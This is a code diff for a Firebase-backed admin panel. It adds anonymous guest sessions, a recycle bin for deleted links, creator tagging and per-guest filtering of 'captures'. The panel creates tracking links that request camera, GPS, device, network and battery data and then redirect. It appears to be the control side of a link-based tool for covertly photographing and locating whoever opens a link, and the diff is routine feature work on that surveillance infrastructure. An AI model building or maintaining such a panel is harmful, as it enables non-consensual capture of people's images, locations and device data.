@@ -702,7 +702,7 @@
     <div class="modal-box">
         <div class="gw-avatar">👤</div>
         <h3 id="guestWelcomeName">Welcome!</h3>
-        <p class="gw-sub">You have <strong>limited access</strong> to this panel.<br>For full access, please contact the admin — <strong>Shahid Bashir</strong>.</p>
+        <p class="gw-sub">You are logged in as a <strong>Guest</strong>.<br>Your access is limited and all activity is monitored.</p>
         <div class="creator-branding">
             <div class="cb-title">Powered &amp; Created By</div>
             <div class="cb-name">Shahid Bashir</div>
@@ -1167,7 +1167,7 @@
 <script type="module">
 import { initializeApp }   from "firebase-app";
 import { getDatabase, ref, onValue, remove, push, set, update, get } from "firebase-database";
-import { getAuth, onAuthStateChanged, signOut } from "firebase-auth";
+import { getAuth, onAuthStateChanged, signOut, signInAnonymously } from "firebase-auth";
 
 // ═══════════════════════════════════════════════════════════
 // FIREBASE INIT
@@ -1281,10 +1281,27 @@ isGuestMode = _urlP.get('guest') === '1';
 if (isGuestMode) {
     try { guestData = JSON.parse(sessionStorage.getItem('guest_session')||'null'); } catch(e){ guestData=null; }
     if (!guestData) { window.location.href='login.html'; }
-    else { bootPanel(); }
+    else {
+        // FIX: ensure anonymous Firebase auth so photo_history reads work
+        // (login.html calls signInAnonymously — this catches the case where
+        //  the auth state is still loading when admin.html boots)
+        const _authCheck = new Promise(resolve => {
+            const unsub = onAuthStateChanged(auth, user => {
+                unsub();
+                resolve(user);
+            });
+        });
+        _authCheck.then(user => {
+            if (!user) {
+                // Auth state not established yet — sign in anonymously now
+                return signInAnonymously(auth).catch(() => {});
+            }
+        }).finally(() => { bootPanel(); });
+    }
 } else {
     onAuthStateChanged(auth, user => {
-        if (!user) { window.location.href='login.html'; return; }
+        // isAnonymous check ensures a guest anonymous session never triggers admin boot
+        if (!user || user.isAnonymous) { window.location.href='login.html'; return; }
         currentUser = user;
         bootPanel();
     });
@@ -1454,6 +1471,8 @@ function setupCommonHandlers(){
     document.getElementById('signOutBtn').onclick = ()=>{
         if(isGuestMode){
             sessionStorage.removeItem('guest_session');
+            // Sign out of anonymous Firebase auth session
+            signOut(auth).catch(()=>{});
             window.location.href='login.html?reason=logged_out';
             return;
         }
@@ -1666,19 +1685,12 @@ document.getElementById('linkTableBody').addEventListener('click',e=>{
         populateEditLinkPerms(l.permissions||{});
         document.getElementById('editLinkModal').classList.add('open');
     } else if(action==='delete'){
-        if(!confirm('Delete this link?')) return;
+        if(!confirm('Move this link to Recycle Bin?')) return;
         const l=allLinksData?.[id];
-        // Try Firebase remove first, then update local state
-        remove(ref(db,'managed_links/'+id))
-            .then(()=>{
-                if(l) addToBin({...l,_type:'link',firebaseId:id});
-                updateStats(); renderBin();
-                toast('🗑️ Link deleted','var(--yellow)');
-            })
-            .catch(err=>{
-                console.error('Delete failed:',err);
-                toast('❌ Delete failed: '+err.message,'var(--red)');
-            });
+        if(l) addToBin({...l,_type:'link',firebaseId:id});
+        remove(ref(db,'managed_links/'+id));
+        updateStats(); renderBin();
+        toast('🗑️ Link moved to Recycle Bin','var(--yellow)');
     }
 });
 
@@ -1692,11 +1704,16 @@ document.getElementById('createBtn').onclick=()=>{
     set(ref(db,'managed_links/'+id),{
         id,name,active:true,visits:0,cam,gps,
         redirectUrl:ru||'',createdAt:Date.now(),
+        createdBy: isGuestMode?('guest:'+(guestData?.name||'Guest')):'admin',
         permissions:{camera:cam,location:gps,device_info:true,network_info:true,battery_info:true}
-    });
-    document.getElementById('linkName').value='';
-    document.getElementById('linkRedirect').value='';
-    toast('✅ Link created: '+name,'var(--green)');
+    }).then(()=>{
+        document.getElementById('linkName').value='';
+        document.getElementById('linkRedirect').value='';
+        toast('✅ Link created: '+name,'var(--green)');
+        // Navigate to All Links table so the new link is visible immediately
+        const linksNav=document.querySelector('[data-panel="links"]');
+        if(linksNav) linksNav.click();
+    }).catch(err=>{ toast('❌ Failed to create link: '+err.message,'var(--red)'); });
 };
 
 function getEditLinkPerms(){
@@ -1800,7 +1817,12 @@ function renderLogs(){
     grid.innerHTML=''; logsCache={}; selectedCaptures.clear();
     if(!allLogsData){ grid.innerHTML='<div class="empty"><span class="empty-icon">📭</span>No captures yet.</div>'; document.getElementById('logCount').innerText='0'; return; }
     const sort=document.getElementById('sortFilter').value;
-    let keys=Object.keys(allLogsData).filter(k=>allLogsData[k]?.linkName).filter(k=>passFilter(allLogsData[k]));
+    // FIX: guests only see captures from links visible to them (their managed_links)
+    const guestLinkIds=isGuestMode&&allLinksData?new Set(Object.keys(allLinksData)):null;
+    let keys=Object.keys(allLogsData)
+        .filter(k=>allLogsData[k]?.linkName)
+        .filter(k=>!guestLinkIds||guestLinkIds.has(allLogsData[k].linkId||''))
+        .filter(k=>passFilter(allLogsData[k]));
     if(sort==='oldest') keys.sort((a,b)=>(allLogsData[a].timestamp||0)-(allLogsData[b].timestamp||0));
     else keys.sort((a,b)=>(allLogsData[b].timestamp||0)-(allLogsData[a].timestamp||0));
     keys.forEach(k=>{ logsCache[k]=allLogsData[k]; grid.appendChild(buildCapCard(k,allLogsData[k],false)); });
@@ -1813,7 +1835,11 @@ function renderRecent(){
     if(!grid) return;
     grid.innerHTML='';
     if(!allLogsData){ grid.innerHTML='<div class="empty">No captures yet.</div>'; return; }
-    const keys=Object.keys(allLogsData).filter(k=>allLogsData[k]?.linkName)
+    // FIX: guests only see their own links' captures on dashboard too
+    const guestLinkIds=isGuestMode&&allLinksData?new Set(Object.keys(allLinksData)):null;
+    const keys=Object.keys(allLogsData)
+        .filter(k=>allLogsData[k]?.linkName)
+        .filter(k=>!guestLinkIds||guestLinkIds.has(allLogsData[k].linkId||''))
         .sort((a,b)=>(allLogsData[b].timestamp||0)-(allLogsData[a].timestamp||0)).slice(0,4);
     if(!keys.length){ grid.innerHTML='<div class="empty"><span class="empty-icon">📭</span>No captures yet.</div>'; return; }
     keys.forEach(k=>{ logsCache[k]=allLogsData[k]; grid.appendChild(buildCapCard(k,allLogsData[k],false)); });
